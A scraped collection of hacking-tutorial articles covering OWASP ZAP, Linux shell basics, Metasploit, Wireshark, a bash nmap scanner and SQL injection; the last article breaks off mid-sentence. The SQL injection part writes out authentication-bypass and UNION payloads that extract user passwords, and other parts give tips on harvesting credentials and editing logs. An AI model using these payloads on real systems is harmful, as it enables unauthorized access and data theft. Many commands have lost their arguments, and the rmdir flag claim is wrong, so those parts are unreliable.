                title: " What is OWASP ZAP?",
                description: "Learn more about OWASP ZAP",
                content: "OWASP ZAP is a powerful penetration testing tool designed to help developers and security professionals detect and find vulnerabilities in web applications. It offers multiple security functions, including:\nPassively scanning web requests Using dictionary lists to search for files and folders on web servers Using crawlers to identify a site’s structure and retrieve all links and URLs Intercepting, displaying, modifying, and forwarding web requests between browsers and web applications OWASP ZAP can identify vulnerabilities in web applications such as compromised authentication, exposure of sensitive data, security misconfigurations, SQL injection, cross-site scripting (XSS), insecure deserialization, and components with known vulnerabilities.\n6 Key Capabilities of the OWASP ZAP Tool linkZAP sits between a web application and a penetration testing client, functioning as a proxy to capture data transmitted and determine how the application responds to potentially malicious requests. OWASP ZAP is versatile and can be used by professionals of various skill levels and job roles.\n1. Active vs. Passive Scans linkZAP offers two types of scans—active and passive.\nPassive Scans: These scans check HTTP requests and application responses for known security vulnerabilities without making changes to requests. They pose a low risk as they cannot change data, but may miss aggressive vulnerabilities like SQL Injection (SQLi).\nActive Scans: These scans create and modify requests sent to the application, sending test requests that surface vulnerabilities which cannot be caught using passive scans. Active scans are generally more effective but may create or delete data in the application.\n2. Running Scans: Desktop vs. API linkOWASP ZAP can be deployed as a desktop application or automatically via an API:\nDesktop Application: Ideal for security analysts and penetration testers running one-off tests to detect vulnerabilities. API Automation: Suitable for software development and security teams to ensure regular security testing of applications and their APIs. 3. Authenticated Security Scanning linkFor web applications requiring authentication, ZAP must be configured with authentication credentials to test protected paths. ZAP supports various authentication formats, including:\nForm-based authentication Script-based authentication JSON-based authentication HTTP/NTLM-based authentication 4. WebSockets linkWebSockets create an asynchronous communication channel between client and server, transmitting data in full duplex. This continuous open channel can lead to security vulnerabilities such as eavesdropping or session hijacking. ZAP continuously scans WebSockets to identify these vulnerabilities.\n5. OWASP ZAP Fuzzer linkFuzzing involves sending large volumes of unexpected data inputs to a test application to discover vulnerabilities. ZAP’s fuzzer allows for:\nSelection of built-in payloads Downloading a variety of payloads from the ZAP community Creating custom payloads 6. AJAX Spidering linkAJAX scraping detects requests from AJAX-rich web applications that normal crawlers may miss. ZAP’s AJAX Spider tool, accessible through the tools menu, offers configuration parameters like maximum crawl depth, status, and duration to avoid infinite crawls.\nOWASP ZAP Tutorial: Installation and Initial Configuration linkPrerequisites link Installers: Available for Windows, Linux, and Mac OS/X, as well as Docker images. Download the appropriate installer from the download page. Java 8 or higher: Required to run ZAP. The Mac OS/X installer includes the appropriate Java version, but Java 8+ must be installed separately for Windows, Linux, and cross-platform versions. The Docker version includes Java. Permission: Ensure you have permission from the web application owner to perform a penetration test. Initial Configuration link Start ZAP: Choose whether to make the ZAP session persistent. If persisted, the session is saved to a local HSQLDB; otherwise, files are deleted on logout. Run a quick start auto scan: Start ZAP and click the Quick Launch tab. Click the Auto Scan button. Enter the full URL of the web application in the Attack URL text box. Select either “Use traditional spider,” “Use AJAX spider,” or both. Click Attack. ZAP Spiders linkZAP offers two spiders for scraping web applications:\nTraditional Spider: Inspects HTML in a web application’s response to detect links. It is fast but less effective for AJAX web applications that use JavaScript to generate links. AJAX Spider: Effective for JavaScript applications, it invokes a browser to render the full JavaScript of the page and follows any links. It is slower and requires additional configuration for headless environments. Passive vs. Active Scanning link Passive Scanning: Investigates all proxy requests and responses without changing the response. Safe and can be run in the background, but may miss some vulnerabilities. Active Scanning: Uses known attack vectors against the selected target. Real attacks that might cause damage, should not be used without permission. OWASP ZAP is a comprehensive tool for identifying vulnerabilities in web applications, offering capabilities for both passive and active scanning, authenticated testing, WebSockets scanning, fuzzing, and AJAX spidering. Whether used via a desktop application or automated API, it provides robust support for security professionals to enhance web application security.\n"

                title: "A Getting Started Guide To Linux",
                description: "Welcome to the basics of Linux for Hacking.",
                content: "What is Linux? linkThe Linux kernel was created by Linus Torvalds in 1991. It becomes an operating system with the addition of components like a package manager, desktop environment, shell, and bootloader.\nAs an open-source OS, Linux offers numerous customizations. Each unique combination of these customizations is called a distribution or “distro.”\nThere are hundreds, if not thousands, of distros worldwide, each optimized for specific purposes or created just for fun by enthusiasts.\nNotable distros include:\nUbuntu (Most common) Elementary OS (Visually appealing) Debian (Neat and classy) Arch Linux (For advanced users) Red Hat Enterprise Linux Why Hackers Prefer Linux linkLinux is the preferred OS for many hackers due to its open-source nature, lower vulnerability to malware, lightweight structure, portability, and compatibility with various hacking tools.\nWindows, being a closed system, restricts many activities hackers need. Mac OS also has limitations due to its proprietary software. In contrast, Linux offers numerous distros that can be freely modified.\nCommonly used hacking distros include Kali Linux, Parrot, BlackArch, and Archstrike. The options, however, are limitless.\nOne of Linux’s standout features is its customizability, particularly in the desktop environment, which is essentially the visual interface of the OS.\nIn Windows, there’s a basic taskbar, start menu, and a background with icons. While you can make slight modifications, Linux offers extensive customization.\nPopular desktop environments include:\nGnome KDE Plasma (Similar to Windows) Xfce (For advanced users) Mate (Resource-efficient) If you’re into programming, you can build upon an existing desktop environment or develop your own to suit your needs.\nTip: If you’re new to Linux, you might want to avoid replacing your default OS immediately. Many users are accustomed to a GUI (Graphical User Interface), but Linux users often rely on the CLI (Command Line Interface). This is because Linux targets developers and scientists more than the average user.\nIt’s advisable to install a Linux distro on a hypervisor like VirtualBox to get accustomed to it (I don’t recommend VMware due to a known vulnerability at the time of writing). You can learn how to install Linux here.\nLinux Package Management linkLinux differs from other OSs, including in how applications are installed. Instead of using .exe and .msi installers like in Windows, Linux uses package managers.\nA package manager is software that manages the installation of applications. Popular package managers include:\nApt (Linux) Chocolatey (Windows) MacPorts (MacOS) Pip (Python) Npm (JavaScript) Gradle (Java) Composer (PHP) With some commands in the terminal, and help from a package manager, your Linux system can connect to servers, download applications, and install them. System updates are managed similarly.\nWhile some .exe and .msi installers can work on Linux with the help of Wine, a software that adds a Windows compatibility layer, not all applications are supported.\nGamers might consider installing Steam or SteamOS for a better experience 🎮.\nLinux File Structure linkLike Windows, Linux has a directory tree. At the root is the ‘/’ folder, equivalent to the C: drive in Windows. It contains all directories, files, and applications.\nImportant directories include:\n/bin: Binary or executable programs (good for persistent scripts) /etc: System configuration files (useful for credentials) /home: User home directories (default directory on terminal start) /opt: Optional or third-party software /tmp: Temporary files, cleared on reboot (useful for temporary scripts) /usr: User-related programs /var: Log files (crucial for forensic analysis) There’s much more to the Linux file structure, but this should suffice for now.\nLet’s get hands-on with the terminal and run some essential commands every hacker should know.\nIntro to the Linux Shell linkA shell is a text-based interface for controlling a Linux computer. Similar to Microsoft’s PowerShell or cmd, it acts as the interface between the user and the kernel, aside from the GUI (Graphical User Interface).\nThere are various types of shells, each built with improvements based on previous versions or optimized for a particular goal.\nHackers frequently use shells because they provide the fastest and most efficient way to deliver instructions to a computer. While the GUI is useful, it can be limited because some features are inaccessible graphically, or the tool you want to use lacks a graphical interface.\nCommon shells include:\nThe Bourne shell (sh) The GNU-Bourne Again shell (bash) The Z shell (zsh) The C shell (csh) The Korn shell (ksh) Quick lesson: The terms ‘terminal’ and ‘shell’ are often used interchangeably in the cybersecurity world and throughout this article. However, they are different. The terminal is the program that lets you access the shell via a graphical interface.\nBasic Linux Shell Commands linkIn this article, we’ll go through the following commands: whoami, pwd, ls, cd, touch, cat, nano, operators, mv and cp, mkdir, rm and rmdir, stat, echo, grep, the ‘help’ flag and man pages.\nYou will need any Linux distro of your choice, though I suggest Kali. If you don’t know how to install one, you can read this article.\nOpen up the application called ‘Terminal’ and let’s begin.\nHow to use the whoami command linkYou use this command to check which user you are. On a personal computer, you are most likely to have only two accounts: the one created when installing the OS and root. If you are in the terminal as a normal user (account), you can try it out.\nwhoami If you want to be root, run the command sudo su and put in your password. Try whoami and the terminal will tell you root:\nsudo su whoami Enterprise computers tend to have many users on one computer. Each has various permissions, some more than others. When you gain initial access post-exploitation, you usually start with a standard account. To check the name of the compromised account, use this command.\nHow to use the pwd command linkThe Present Working Directory (pwd) command informs you of where you currently are in the directory tree. By default, this usually is the home directory.\npwd If you are a beginner, it’s quite normal to be lost in the directory tree and suddenly lose track of where you are. This command helps you to keep track of things.\nDepending on your distro, you may see a ~ symbol when you open the terminal. That is the symbol for the default home directory for the user. It’s like the C:\\Users\\ folder in Windows, containing all user-specific files. In Linux, it will be in the format /home/.\nHow to use the ls command linkYou use the ls command to list the contents of a directory. It lets you know what files are inside a directory without a GUI.\nWhen used with flags, it’s a Swiss army knife, with various ways of showing what’s in the directory.\nCommon flags you might want to take note of are -l (long listing), -a (all aka show hidden files), and -c (show recently modified).\nls -l Flags are features of applications/tools that allow you to tell them what to do. For example, long listing can be activated by using the command ls -l.\nHow to use the cd command linkYou use the Change Directory (cd) command to traverse the directory tree.\ncd If you run the command ls -a, you will notice that there are two files that are always there no matter the folder: . and ... The . file represents the current directory, and the .. file represents the parent directory (the directory above the current one).\nHow to use the cat, more, and less commands linkThese commands display the content of files to the terminal. However, there are notable differences. cat is commonly used for files with small amounts of text, while less and more are used for files with large amounts of text, allowing controlled output with the arrow keys.\ncat more less cat prints the output directly to your terminal, while more and less allow you to use the arrow keys. Output commands are used to gather information and credentials from compromised systems.\nHow to use the touch command linkYou use the touch command to create files. You can write to these files in several ways, such as using a text editor or piping input into it.\ntouch You can then use the ls command to check if your file has been created.\nHow to use the nano command linkNano is a popular built-in text editor in Linux. It’s very common because it’s easy to use and supported in many CLI environments. Other common text editors are Vim and gedit.\nYou can edit a file with the following command:\nnano The nano interface includes some commands at the bottom for assistance. ‘^’ means the Ctrl button, and the ‘M’ button is Alt. ‘^S’ (or Ctrl + S) saves the file. The nano command is used by hackers to change information in files, edit logs, or if you are a red hat hacker, delete essential configuration file lines.\nCommand Chaining Operators link‘Chaining’ commands means writing multiple commands together and executing them in various ways using special characters. Examples include:\nAmpersand (\u0026): Runs a program in the background Logical AND (\u0026\u0026): The following command runs only if the previous one successfully ran Pipe (|): The output of the previous command acts as input for the next command Overwrite (\u003e): Overwrites the content of a file with the output of the previous one Append (\u003e\u003e): Appends the output from the previous command to a file How to use the mv and cp commands linkThese commands are quite similar but have notable differences. Use mv to move a file to another location and cp to copy a file to another location.\nmv cp There isn’t a command for renaming files in Linux, so most people use the mv command by following this syntax:\nmv Try it yourself to get a feel.\nHow to use the mkdir command linkThe mkdir command creates directories. You could use this to make a custom directory that only you can access on a compromised system to keep scripts or tools for persistence.\nmkdir How to use the rm and rmdir commands linkThe rm command removes files, and rmdir removes directories.\nrm rmdir Linux doesn’t easily delete folders if they are not empty. Use the ignore-fail-if-non-empty flag to delete both files and directories.\nBe extremely careful with these commands as they do not send the deleted files or directories to the Trash/Recycle bin. They’re just gone.\nHow to use the stat command linkYou use the stat command to obtain detailed information about a file.\nstat The stat command provides information about the file name and extension, permissions, creation time, modification time, last access time, and more.\nNow is a great time to learn about permissions. If you run the commands ls -la or stat, you may see something like this: drwxrwxrwx. Let’s break it down.\nThe read (r) permission allows you to see the contents of a file, the write (w) permission allows you to modify the file, and the execute (x) permission allows you to run it as a process if it is a script or executable.\nThere are 3 classes of users that can access a file: user, group, and others. The root account is another class but is not considered here.\nEach ‘rwx’ set is owned by a permission class. If the space reads a letter, the set has that permission. If it has a dash, they do not have that permission.\nThe ‘d’ at the front represents whether it is a directory or a file. The ‘d’ means it’s a directory, and a dash (-) means it’s a file. Technically, a directory is a special type of file, but that’s a story for another day.\nHow to use the echo command linkYou use the echo command to print out input. Let’s use an example to make things clearer.\necho \"\" You can also use echo with the \u003e operator to write text to files.\nHow to use the grep command linkYou use the grep command to extract specified text from a file using the pipe operator.\ngrep \"\" The command above instructs the computer to print the contents of a file and, using the pipe operator, directs the grep command to use it as input. This process is called piping one command through another and can be done multiple times. The found text is shown in red.\ngrep is commonly used to search for specific text in large files. For example, if you are looking for credentials for a specific user in a file with a lot of text, you could use grep to search for keywords like ‘password’, ‘login’, and other relevant terms.\nHow to use the ‘help’ flag and man pages linkThe ‘help’ flag isn’t necessarily a command but it is a great aid if you are confused about an app or tool. Simply use the following:\n--help This will provide quick, bite-sized information about it. man, on the other hand, gives you all documented information about the app.\nman You may notice that in some cases, -h is used as the short form of the help flag. If it starts with a single dash, that’s the short form. If it starts with two dashes, it’s the long form.\nHow to Update Your Linux linkThis entire section can actually be done with a single command, but let’s break it down to understand the whole process. The task: update your OS. To achieve this, you need to do two things:\nUpdate the local repository info: Think of this like checking for updates before actually downloading and installing them. Upgrade the system: This involves downloading the updates and then installing them. The first command to run is:\nsudo apt update sudo: Indicates we are running the command with higher permissions apt: The package manager update: Instructs the computer to update its local information about the repository After you enter this command and provide your password, your computer will download information from the repositories about what packages (applications) need updates.\nOnce the update is complete, run the next command to download and install the updates:\nsudo apt full-upgrade Note: You can interrupt the package download process, but never the installation process, as it might break your OS and render it unusable.\nAfter the upgrades have finished installing, you will want to reboot your computer to fully implement all updates.\nYou have successfully updated your system. Remember how I said all this could be done with one command? Here it is:\nsudo apt update \u0026\u0026 sudo apt upgrade -y \u0026\u0026 reboot This command is composed of three parts:\nsudo apt update sudo apt upgrade -y reboot The \u0026\u0026 symbols are logical AND operators that tell the computer to run the first command, and if it completes successfully, proceed to the next one. The -y flag tells the computer to carry out the upgrade without requiring user input.\nThis combined command updates, upgrades, and then reboots the system.\n"

                title: "An Introduction to Metasploit",
                description: "Learn more about the Metasploit framework.",
                content: "Introduction to Metasploit linkThe Metasploit Framework is a robust and versatile tool used extensively in the field of cybersecurity. It serves a dual purpose, utilized by both ethical hackers and cybercriminals to identify and exploit vulnerabilities within networks and servers. As an open-source platform, Metasploit offers extensive customization and compatibility with various operating systems, making it a go-to resource for penetration testing and vulnerability assessment.\nUnderstanding Metasploit linkMetasploit allows penetration testers to deploy pre-written or custom scripts to explore network weaknesses. By simulating attacks, security professionals can uncover and document vulnerabilities, providing crucial information to address these issues and enhance system defenses. This proactive approach is a cornerstone of modern cybersecurity practices, ensuring that potential threats are identified and mitigated before they can be exploited maliciously.\nHistorical Background linkThe Metasploit Project was initiated in 2003 by H.D. Moore, originally as a Perl-based tool designed for network probing. With contributions from core developer Matt Miller, the project evolved and was fully rewritten in Ruby by 2007. In 2009, Rapid7, a Boston-based company, acquired Metasploit, integrating it into their suite of security tools. Rapid7 has since expanded the framework’s capabilities, incorporating features for intrusion detection, exploit development, fuzz testing, anti-forensics, and evasion techniques.\nWho Uses Metasploit? linkMetasploit’s extensive functionality and open-source nature make it a valuable asset for a diverse range of users, from DevSecOps professionals to hackers. Its popularity among hackers underscores the importance for security experts to be well-versed in its use, ensuring they can protect systems against the very techniques Metasploit facilitates. The framework supports over 1,677 exploits across 25 platforms, including Android, PHP, Python, Java, and Cisco, and boasts nearly 500 payloads, such as:\nCommand Shell Payloads: Enable execution of scripts or commands on the target system. Dynamic Payloads: Generate unique payloads to evade antivirus detection. Meterpreter Payloads: Allow control over sessions, file transfers, and system monitoring. Static Payloads: Facilitate port forwarding and network communication. Benefits and Applications of Metasploit linkTo effectively utilize Metasploit, users must gather detailed information about the target system through port scanning, OS fingerprinting, or vulnerability scanning. Once this data is obtained, selecting an appropriate exploit and payload becomes straightforward. An exploit identifies a system weakness, and a payload delivers the necessary code to exploit that vulnerability.\nMetasploit comprises various modules and interfaces, including:\nmsfconsole: An interactive command-line interface. msfcli: Allows command-line access to Metasploit functions. Armitage: A graphical Java tool that integrates with Metasploit for visualizing targets and exploits. Metasploit Community Web Interface: Supports remote penetration testing. Ethical and Practical Considerations linkWhile Metasploit is a powerful tool for security professionals, it is also a preferred utility for malicious hackers. Ethical hackers should use measures like VPNs and dedicated VPS to protect their identity and avoid disruptions during testing. Furthermore, Metasploit offers various modules such as exploits, payloads, auxiliary functions, encoders, listeners, shellcode, post-exploitation code, and no-ops (nops).\nGetting Started with Metasploit linkMetasploit can be downloaded from the Rapid7 website. It requires disabling antivirus software and firewalls during installation and administrative privileges. The framework is pre-bundled with Kali Linux, while Windows users can use an install shield wizard. Initial setup involves creating databases, starting PostgreSQL, and establishing database schemas.\nLearning and Using Metasploit linkFamiliarity with Ruby or other scripting languages like Python can facilitate learning Metasploit. Given the risks involved, it’s advisable to use a dedicated work device for testing.

A network packet analyzer presents captured packet data in as much detail as possible.\nYou could think of a network packet analyzer as a measuring device for examining what’s happening inside a network cable, just like an electrician uses a voltmeter for examining what’s happening inside an electric cable (but at a higher level, of course).\nIn the past, such tools were either very expensive, proprietary, or both. However, with the advent of Wireshark, that has changed. Wireshark is available for free, is open source, and is one of the best packet analyzers available today.\nWhat is Wireshark used for? linkWireshark is a great tool that converts network traffic into a human-readable format. If we look at the key features of Wireshark, it can capture live traffic packets, analyze real-time network traffic, and filter traffic based on different criteria.\nResearchers use Wireshark to analyze the content of the packets and create various statistics; Security teams use Wireshark to examine suspicious network traffic content, identify traffic spikes, etc.; Troubleshoot network issues; Identifying and learning about network traffic protocols; Debugging protocol implementation; Verifying network applications. How to use Wireshark? linkSince Wireshark is open source, you can download and use any version of Wireshark for free from wireshark.org. It’s available for Linux, Windows, and Mac. It also has a user-friendly graphical user interface (GUI) to simplify the analysis process. While Wireshark initially supported only Solaris and Linux, now it runs on all the major operating systems. Keep reading for detailed instructions on how to install and start using Wireshark.\nInstalling Wireshark linkTo install Wireshark, open your terminal and run the following command:\nsudo apt update \u0026\u0026 sudo apt upgrade Now you are ready to install Wireshark.

                description: "Welcome to the basics of Linux for Hacking.",
                content: "Any self-respecting hacker must be able to script. For that matter, any self-respecting Linux administrator must be able to script. With the arrival of the Windows PowerShell, Windows administrators are increasingly required to script as well to perform automated tasks and be more efficient.\nAs a hacker, we often need to automate the use of multiple commands, sometimes from multiple tools. To become an elite hacker, you not only need to have advanced shell scripting skills, but also the ability to script in one of the widely-used scripting languages such as Ruby (Metasploit exploits are written in Ruby), Python (many hacking tools are Python scripts), or Perl (Perl is the best text manipulation scripting language).\nWe will start with basic shell scripting, move to advanced shell scripting, and then to each of these scripting languages developing hacking tools as we go. Our ultimate goal will be to develop enough scripting skills to be able to develop our own exploits.\nIn a previous post, I showed you how to put together a simple script using nmap to scan a range of IP addresses to check for a particular port availability. We will need that script here, as we will be adding new functionality to it after completing some preliminaries.\nTypes of Shells linkA shell is an interface between the user and the operating system. This enables us to run commands, utilities, programs, manipulate files, etc.\nThere are a number of different shells available for Linux. These include the:\nKorn shell the Z shell the C shell the bash As the BASH shell is available on nearly all Linux and UNIX distributions (including Mac OS X, and Kali), we will be using the BASH shell here, exclusively.\nBASH Basics linkCommands linkBesides being able to run any system commands, utilities or applications from a BASH shell script, the BASH shell includes some of its own commands. These include;\n:, ., break, cd, continue, eval, exec, exit, export, getopts, hash, pwd, readonly, return, set, shift, test, [, times, trap, umask and unset,alias, bind,builtin, command, declare, echo, enable, help, let, local, logout, printf, read, shopt, type, typeset, ulimit and unalias.\nI will address these commands in a later tutorial, but I want you to know that this shell has built in commands that have their functionality within the BASH shell.\nComments linkLike any coding, we may want to add comments. Comments are simply notes to ourselves or anyone else that reads the code as to what we were trying to do with the script or that section of the script. These notes or “comments” are not read or executed by the interpreter.\nThe BASH shell enables comments by preceding a line with the “#”, so if I wanted to note that this was my first script, I could write in my text editor;\nThis is my first script!\nThe interpreter would ignore everything after the # and then move to the next line.\nSimple Hello World linkFor our first script, we will start with a simple script that returns a message to the screen that says “Hello World!”.\nWe start by entering the shebang or “#!”. This tells the operating system that whatever follows the shebang is the interpreter we want to use for our script.\nWe then follow the shebang with /bin/bash indicating that we want the operating system to use the BASH shell interpreter. As we will see in later tutorials, we can use other interpreters such as PERL or Python, but here we want to use the BASH interpreter.\nNext, we enter echo, a command in Linux that tells the system to simply repeat or “echo” back to our monitor (stdout) what follows. In this case, we want the system to echo back to us “Hello World”. Note that the text or message we want to “echo back” is in double quotation marks.\n#! /bin/bash echo \"Hello World\"| Set Execution Permission linkWhen we create a file, it’s not necessarily executable, not even by us, the owner. Let’s look at the permissions on our new file, by typing ls -l in our directory.\nAs you can see, our new file has rw-r–r– (644) permissions. The owner of this file only has read (r) and write (w) permissions, but no execute (x) permissions. The group and all have only read permission. We need to modify it to give us execute permissions in order to run this script. We do this with the chmod command. To give the owner, the group, and all execute permissions, we type:\nkali \u003e chmod 755 HelloHackersArise\nNow when we do a long listing (ls -l) on the file, we can see that we have execute permissions.\nkali \u003e ls -l Run HelloWorld\nTo run our simple script, we simply type:\nkali \u003e ./HelloWorld The ./ before the file name tells the system that we want to execute this script in the current directory. This means don’t look in the directories in the PATH variable for this file, but rather look just in my current directory and run HelloWorld\nWhen we then hit enter, our very simple script returns to our monitor.\nHello World Success! We just completed our first simple script!\nUsing Variables linkSo, now we have a simple script. All it does is echo back a message. If we want to create more advanced scripts we will likely want to add some variables.\nVariables are simply an area of storage where we can hold something in memory. That “something” might be some letters or words (strings) or numbers. It can help to add functionality to a script that has values that might change.\nLet’s go back to the script we wrote earlier to use nmap to scan for vulnerable machines with a particular port open. Remember, the (in)famous hacker, Max Butler, used a similar script to find systems with the Aloha POS that he was able to hack for millions of credit card numbers.\nAs you can see, this script was written to scan a range of IP addresses looking for port 5505 open (the port Aloha left open for tech support), and then create a report with all the IP addresses with this port open. The IP address range is “hard coded” into the script and can only be changed by opening and editing the script file.\nWhat if we wanted to alter this script so that it would prompt us or any user for the range IP addresses to scan and the port to look for? Wouldn’t it be much easier to use if we were simply prompted for these values and they were then entered into the script?\nLet’s take a look at how we could do that.\nAdding Prompts \u0026 Variables to Our Script linkFirst, we could replace the specified sub-net with a IP range. We can do this with a variable called “FirstIP” and then a second variable named “LastIP” (the name of the variable is irrelevant, but best practice is to use a variable name that helps you remember what it holds).\nNext, we can replace the port number with a variable named “port”. These variables will simply be storage areas to hold the info that the user will input before running the scan.\nNext, we need to prompt the user for these values. We can do this by using the echo command we learned above in writing the HelloHackersArise script.\nSo, we can simply echo the words “Enter the starting IP address :” and this will appear on the screen asking the user for the first IP address in their nmap scan.\necho \"Enter the starting IP address :\" Now, the user seeing this prompt on the screen, will enter the first IP address. We need a way then to capture that input from the user. We can do this by following the echo line with the read command followed by the name of the variable. The read command takes a value entered at the keyboard (stdin) and puts it into a variable that follows it.\nread FirstIP The above command will put the IP address entered by the user into the variable, FirstIP. Then we can use that value in FirstIP throughout our script.\nOf course, we can do the same for each of the variables by first prompting the user to enter the information and then using a read command to capture it.\nNext, we just need to edit the nmap command in our script to use the variables we just created and filled. When we want the value stored in the variable, we can simply preface the variable name with the $, such as $port.\nSo, to use nmap to scan a range of IP addresses starting with the first user input IP through the second user input IP and look for a port input by the user, we can re-write the nmap command like this:\nnmap -sT $FirstIP-$LastIP -p $port -oG Aloha Now, as the script is written, it will scan an IP address range starting with FirstIP and ending with LastIP looking for the port the user input. Let’s now save our script file and name it Scannerscript.\nRun It with User Input Variables linkNow we can run our simple scanner script with the variables that tell the script what IP address range and port to scan without having to edit the script.\nkali \u003e ./Scannerscript As you can see, the script prompts us for the first IP address, then the last IP address and the port we want to scan for. After collecting this info, it then does the nmap scan and produces a report of all the IP addresses in the range that have the port open that we specified.\n"

                content: "Capturing data packets on Wireshark linkWhen you open Wireshark, you see a screen showing you a list of all the network connections you can monitor. You also have a capture filter field to only capture the network traffic you want to see.\nView post on imgur.com You can select one or more of the network interfaces using shift+left-click. Once select the network interface, you can start the capture, and there are several ways to do that\nStarting the capture linkYou can start on capturing packets by clicking on the blue wireshark icon or click on capture, then the icon, or use the windows shotcut Ctrl + E.\nYou shouls a screen similar to the following:\nView post on imgur.com Once you have captured all the packets needed, use the same buttons or menu options to stop the capture as you did to begin.\nConducting Packet Analysis linkAnalyzing Data Packets on Wireshark linkWireshark provides a comprehensive interface for inspecting packet data, utilizing three distinct panes. This guide details each pane and its functionalities, helping you to effectively analyze network traffic.\n1. Packet List Pane linkThe Packet List is the top pane that lists all the packets captured during a session. Each row represents a single packet, and clicking on a packet will update the other two panes with detailed information about the selected packet.\nNo.: This column indicates the sequence number of the packet in the capture file. A bracket around the number signifies that the packet is part of a conversation. Time: Shows the timestamp of when the packet was captured relative to the start of the capture session. You can adjust this display to show the absolute time, time delta, or other formats via the Settings menu. Source: Displays the IP address or hostname of the sender of the packet. Destination: Displays the IP address or hostname of the receiver of the packet. Protocol: Identifies the protocol used by the packet, such as TCP, DNS, DHCPv6, or ARP. Length: Indicates the size of the packet in bytes. Info: Provides additional details about the packet, which vary depending on the protocol. For instance, it might show the HTTP request method, DNS query, or TCP flags. 2. Packet Details Pane linkThe Packet Details pane, located in the middle, displays a structured, hierarchical view of the packet’s contents. This pane breaks down the packet according to the protocol layers, from the Ethernet header to the application layer data.\nYou can expand and collapse sections to explore specific fields within the packet. Right-clicking on any field allows you to create display filters based on the selected text. This can be useful for isolating packets with specific attributes or values. 3. Packet Bytes Pane linkThe Packet Bytes pane, at the bottom, shows the raw data of the packet in a hexadecimal and ASCII format. This view represents the exact data as captured by Wireshark, providing a byte-by-byte representation.\nThis pane is particularly useful for low-level troubleshooting and when you need to see the precise byte sequence in the packet. Highlighting bytes in this pane will simultaneously highlight the corresponding fields in the Packet Details pane, and vice versa. Wireshark Capture Filters linkCapture filters in Wireshark allow you to limit the packets captured by specifying criteria that packets must meet to be saved. These filters are set before starting the capture and help reduce the volume of data, focusing only on relevant traffic. Here are some common capture filters:\nhost IP-address: Captures all traffic to and from the specified IP address. host 192.168.1.1 net 192.168.0.0/24: Captures all traffic within the specified subnet. net 192.168.0.0/24 dst host IP-address: Captures only packets sent to the specified IP address. dst host 192.168.1.1 port 53: Captures traffic on port 53, which is commonly used for DNS queries. port 53 port not 53 and not arp: Captures all traffic except DNS (port 53) and ARP traffic. port not 53 and not arp You can check the capture filters by clicking on Capture, then Capture Filters. You should see something like this:\nView post on imgur.com Wireshark Display Filters linkDisplay filters in Wireshark allow you to refine the view of captured packets during analysis. These filters do not affect the data captured but help narrow down the packets shown in the Packet List pane, making it easier to troubleshoot specific issues. Here are some useful display filters:\nip.src == IP-address and ip.dst == IP-address: Shows packets sent from one IP address (source) to another IP address (destination). ip.src == 192.168.1.1 and ip.dst == 192.168.1.2 You can also use ip.addr to show packets to and from the specified IP address: ip.addr == 192.168.1.1 tcp.port eq 25: Shows all traffic on port 25, typically used for SMTP email traffic. tcp.port eq 25 icmp: Shows only ICMP traffic, which is commonly used for ping requests. icmp ip.addr != IP_address: Shows all traffic except the traffic to or from the specified IP address. ip.addr != 192.168.1.1 Analysts can also create custom filters to detect specific types of network activity or attacks. For example, to detect the Sasser worm, you might use the following filter:\nls_ads.opnum == 0x09: Detects packets related to the Sasser worm. ls_ads.opnum == 0x09 Using Filters Effectively link Setting Capture Filters: Before starting your capture, set appropriate capture filters to focus on relevant data and reduce the size of the capture file. This can improve performance and make analysis more manageable. Applying Display Filters: After capturing data, use display filters to isolate specific traffic patterns or troubleshoot issues. Display filters can be combined and layered to create precise views of the data. Custom Filters: For specialized needs, such as detecting security threats or analyzing specific protocols, create and save custom filters. This enhances your ability to quickly respond to network events and anomalies. By mastering the use of capture and display filters, you can efficiently analyze network traffic and identify issues using Wireshark.\n"

                content: "What is SQL Injection (SQLi)? linkSQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries an application makes to its database. This can enable an attacker to view or manipulate data that they normally cannot access. In severe cases, SQL injection can be used to compromise the underlying server or back-end infrastructure, leading to significant data breaches, reputational damage, and regulatory fines.\nImpact of SQL Injection linkA successful SQL injection attack can lead to unauthorized access to sensitive data, such as:\nUser passwords Credit card details Personal user information SQL injection attacks have been used in many high-profile data breaches, causing substantial damage. In some cases, attackers can establish a persistent backdoor into an organization’s systems, leading to prolonged and undetected compromises.\nDetecting SQL Injection Vulnerabilities linkManual Detection Techniques linkYou can manually detect SQL injection vulnerabilities by systematically testing every entry point in the application. Common techniques include:\nSingle Quote Test: Submit a single quote character (') and look for errors or anomalies. SQL-Specific Syntax Tests: Use syntax that evaluates to the same value (e.g., 1=1) and look for differences in responses. Boolean Conditions: Inject conditions like OR 1=1 and OR 1=2 and observe response differences. Time-Based Payloads: Inject payloads designed to trigger time delays and observe response times. Out-of-Band Network Interaction: Use OAST (Out-of-band Application Security Testing) payloads to trigger network interactions. Automated Detection linkTools like Burp Scanner can quickly and reliably detect SQL injection vulnerabilities, reducing the need for manual testing.\nExploiting SQL Injection Vulnerabilities linkCommon SQL Injection Techniques linkSQL injection vulnerabilities can occur in different parts of a SQL query. Here are some common types:\nRetrieving Hidden Data: Modify a SQL query to return additional results. Subverting Application Logic: Change a query to interfere with the application’s logic. UNION Attacks: Retrieve data from different database tables using the UNION keyword. Blind SQL Injection: Exploit vulnerabilities where the query results are not returned in the application’s responses. Examples linkRetrieving Hidden Data linkImagine a shopping application that displays products in different categories. A request to display products in the “Gifts” category might look like this:\nSELECT * FROM products WHERE category = 'Gifts' AND released = 1 An attacker can modify the URL to:\nhttps://insecure-website.com/products?category=Gifts'-- This results in the query:\nSELECT * FROM products WHERE category = 'Gifts'--' AND released = 1 The -- is a comment indicator in SQL, which means the rest of the query is ignored, showing all products including unreleased ones.\nSubverting Application Logic linkIn a login system:\nSELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese' An attacker can bypass authentication by entering:\nUsername: administrator'-- Password: (blank) Resulting in:\nSELECT * FROM users WHERE username = 'administrator'--' AND password = '' UNION Attacks linkRetrieve data from another table:\nSELECT name, description FROM products WHERE category = 'Gifts' Modify input to:\n' UNION SELECT username, password FROM users-- Resulting in:\nSELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users-- Advanced SQL Injection Techniques linkBlind SQL Injection linkBlind SQL injection occurs when the application does not return query results or error details in its responses. Techniques include:\nBoolean-Based Blind SQL Injection: Change the logic of the query to trigger different responses based on a condition. Time-Based Blind SQL Injection: Inject conditions that trigger time delays to infer true/false conditions. Out-of-Band SQL Injection: Trigger external network interactions to exfiltrate data. Second-Order SQL Injection linkOccurs when user input is stored and later used unsafely in a SQL query. For example, an application safely stores user input but later retrieves and uses it without proper 